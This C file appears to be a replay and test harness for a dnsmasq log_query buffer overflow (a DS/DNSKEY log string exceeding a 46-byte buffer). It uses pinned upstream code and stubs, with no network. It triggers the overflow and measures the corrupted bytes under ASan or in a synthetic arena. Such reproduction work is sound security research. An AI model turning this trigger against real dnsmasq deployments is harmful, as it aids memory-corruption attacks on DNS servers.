/* Replay driver for dnsmasq CVE-2026-12725 (log_query DS/DNSKEY overflow).
 * The #included gen_block.h holds VERBATIM pinned lines from src/cache.c
 * (tag v2.92 for the vulnerable build, fix commit 36d081e for the control).
 * Collaborators are stubs; no daemon, socket, DNS packet or network is used.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define ADDRSTRLEN 46 /* INET6_ADDRSTRLEN, dnsmasq.h:171 */
#define F_DNSSECOK (1u << 15)
#define F_UPSTREAM (1u << 16)
#define F_SERVER   (1u << 18)
#define F_QUERY    (1u << 19)
#define F_KEYTAG   (1u << 23)
#define F_IPSET    (1u << 26)
#define F_NOEXTRA  (1u << 27)
#define F_RR       (1u << 30)
#define OPT_EXTRALOG 0
#define HAVE_DNSSEC 1

struct dnsmasq_daemon { char addrbuff[ADDRSTRLEN]; };
static struct dnsmasq_daemon *g_daemon;
#define daemon g_daemon
union all_addr {
  struct { unsigned short keytag, algo, digest; } log;
  struct { unsigned short rrtype; } rrblock, rrdata;
};

static char qbuf[128];
static char *querystr(char *arg, unsigned short type)
{ (void)type; return arg ? arg : qbuf; }
static char *sanitise(char *name) { return name; }
static int option_bool(int opt) { (void)opt; return 0; }

static char *replay_log_query(unsigned int flags, char *name,
                              union all_addr *addr, char *arg,
                              unsigned short type)
{
  const char *extra = NULL;
  char *dest = NULL;
#include "gen_block.h"
  } /* closes the pinned "if (addr)" block */
  printf("EXTRA=%s\n", extra ? extra : "NULL");
  (void)name;
  return dest;
}

int main(int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "capture";
  int asan = strcmp(mode, "asan") == 0;
  unsigned char *arena = NULL;
  unsigned char *victim = NULL;
  size_t n, overflow, changed;
  union all_addr a;
  char name[] = "ds.example";
#ifdef VULN_BUILD
  char fmt[] = "DS for keytag %hu, algo %hu, digest %hu (not supported)";
  unsigned short type = 0; /* pinned dnssec.c:1100 */
#else
  char fmt[] = "DS for keytag %hu, algo %hu, digest %hu";
  unsigned short type = 1; /* pinned dnssec.c:1101 */
#endif

  memset(&a, 0, sizeof a);
  a.log.keytag = 65535; a.log.algo = 255; a.log.digest = 255;

  if (asan) {
    /* ASan gives an exact 46-byte allocation with a redzone after it. */
    g_daemon = (struct dnsmasq_daemon *)malloc(sizeof *g_daemon);
  } else {
    /* Synthetic adjacency in one arena: victim starts at byte 46. This is
     * instrumented adjacency, not a claim about glibc chunk layout. */
    arena = (unsigned char *)malloc(256);
    memset(arena, 0x41, 256);
    g_daemon = (struct daemon *)arena;
    victim = arena + ADDRSTRLEN;
  }
  memset(g_daemon, 0, ADDRSTRLEN);

  replay_log_query(F_NOEXTRA | F_KEYTAG | F_UPSTREAM, name, &a, fmt, type);

  n = strlen(g_daemon->addrbuff);
  overflow = n >= ADDRSTRLEN ? n - ADDRSTRLEN + 1 : 0;
  printf("LAYOUT buflen=%d written=%zu overflow=%zu keytag=%u algo=%u digest=%u type=%u\n",
         ADDRSTRLEN, n, overflow, a.log.keytag, a.log.algo, a.log.digest, type);
  printf("BUFFER=%s\n", g_daemon->addrbuff);
  if (!asan) {
    changed = 0;
    while (changed < 64 && victim[changed] == 0x41) changed++;
    printf("VICTIM first_changed=%zu tail=%02x%02x%02x%02x\n",
           changed, victim[0], victim[1], victim[2], victim[3]);
  }
  free(g_daemon);
  return 0;
}
